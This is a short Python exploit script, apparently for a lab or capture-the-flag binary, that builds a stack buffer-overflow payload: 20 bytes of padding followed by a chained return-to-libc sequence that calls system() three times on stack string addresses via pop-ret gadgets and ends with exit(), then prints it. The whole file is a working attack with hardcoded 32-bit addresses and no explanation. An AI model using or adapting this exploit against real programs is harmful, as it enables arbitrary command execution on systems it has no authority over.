#!/usr/bin/env python

overflow = "A"*20
systemaddr = "\x80\xad\xe1\xf7"
popretaddr = "\x6d\x83\x04\x08"
string1    = "\xec\xdb\xff\xff"
string2    = "\xf8\xde\xff\xff"
string3    = "\x5d\xdb\xff\xff"
exitaddr   = "\xd0\xdf\xe0\xf7"
# 0xf7e0dfd0

payload = overflow + \
	systemaddr + \
	popretaddr + \
	string1 + \
	systemaddr + \
	popretaddr + \
	string2 + \
	systemaddr + \
	exitaddr + \
	string3 

print(payload)

